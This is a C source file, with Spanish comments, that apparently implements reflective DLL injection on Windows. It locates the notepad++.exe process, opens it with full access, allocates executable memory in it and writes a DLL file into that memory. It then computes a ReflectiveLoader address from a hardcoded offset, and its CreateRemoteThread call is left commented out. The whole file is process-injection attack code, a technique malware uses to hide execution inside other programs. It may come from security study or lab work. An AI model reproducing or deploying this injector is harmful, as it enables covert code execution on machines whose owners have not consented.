#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD GetPIDByName(const char *procName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, procName) == 0) { // comparar sin mayúsc/minúsc
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}


int main() {
    const char *target = "notepad++.exe";

    DWORD pid = GetPIDByName(target);
    if (pid) {
        printf("PID de %s: %lu\n", target, pid);
    } else {
        printf("Proceso %s no encontrado.\n", target);
        return -1;
    }

    // ++++++++++++++++++++++++++++++++++++++++++++++

    const char *dll_path = ".\\reflective_dll.dll";
    
    FILE* dll_file = fopen(dll_path, "rb");
    if (!dll_file) {
        printf("Error abriendo DLL\n");
        return -1;
    }

    // Obtener tamaño
    fseek(dll_file, 0, SEEK_END);
    long dll_size = ftell(dll_file);
    fseek(dll_file, 0, SEEK_SET);

    // Leer contenido completo
    unsigned char* dll_buffer = (unsigned char*)malloc(dll_size);
    fread(dll_buffer, 1, dll_size, dll_file);
    fclose(dll_file);

    // ++++++++++++++++++++++++++++++++++++++++++++++

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("Failed to retrieve handle to remote process: %d\n", GetLastError());
        return 1;
    }
    printf("Handle to %s: %p\n", target, hProcess);

    // Reservar memoria en el proceso remoto
    LPVOID remote_mem = VirtualAllocEx(
        hProcess,
        NULL,
        dll_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // Permisos necesarios para ejecución
    );
    printf("virtual alloc: %p\n", remote_mem);

    // Escribir el buffer completo en el proceso objetivo
    BOOL success = WriteProcessMemory(
        hProcess,
        remote_mem,
        dll_buffer,
        dll_size,
        NULL
    );

    free(dll_buffer);

    // ++++++++++++++++++++++++++++++++++++++++++++++

    DWORD_PTR reflective_loader_offset = 0x1000; // offset to ReflectiveLoader
    DWORD_PTR reflective_loader_addr = (DWORD_PTR)remote_mem + reflective_loader_offset;

    printf("ReflectiveLoader address: 0x%p\n", (void*)reflective_loader_addr);

    // Crear hilo remoto que ejecute el ReflectiveLoader
    // HANDLE hThread = CreateRemoteThread(
    //     hProcess, 
    //     NULL, 
    //     0, 
    //     (LPTHREAD_START_ROUTINE)reflective_loader_addr, 
    //     NULL, 
    //     0, 
    //     NULL
    // );

    // WaitForSingleObject(hThread, INFINITE);
    // CloseHandle(hThread);
    CloseHandle(hProcess);
    
    getchar();
    return 0;
}